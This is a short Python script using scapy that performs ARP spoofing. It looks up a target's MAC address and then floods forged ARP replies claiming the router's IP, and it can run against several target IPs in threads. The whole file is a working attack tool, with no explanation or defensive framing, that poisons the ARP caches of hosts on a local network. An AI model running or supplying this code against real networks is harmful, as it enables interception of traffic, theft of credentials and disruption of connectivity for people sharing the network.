import scapy.all as scapy
import threading



def spoof(target_ip, target_mac, spoof_ip):
    arp_spoofed_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at")
    scapy.send(arp_spoofed_packet, verbose=0)



def get_mac(ip):
    arp_mac_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /scapy.ARP(pdst=ip)
    replay, _ = scapy.srp(arp_mac_packet, timeout=3, verbose=0)

    if replay:
        return replay[0][1].src
    return None


def main(target_ip):
    target_mac = None
    while not target_mac:
        target_mac = get_mac(target_ip)
        if not target_mac:
            print("MAC add not found")

    print(target_mac)

    print(f"spoofing: {target_ip}")
    while True:
        spoof(target_ip, target_mac, DEFAULT_GATE)
    

DEFAULT_GATE = "10.0.0.138" #router's ip here

threads = [] #list of all the threads in order to keep track of them
lst = ["10.0.0.17"] #all the ip's to arp spoof here
for item in lst[0:-1]:
    t = threading.Thread(target=main, args=(item,))
    t.start()
    threads.append(t)


    
main(lst[-1])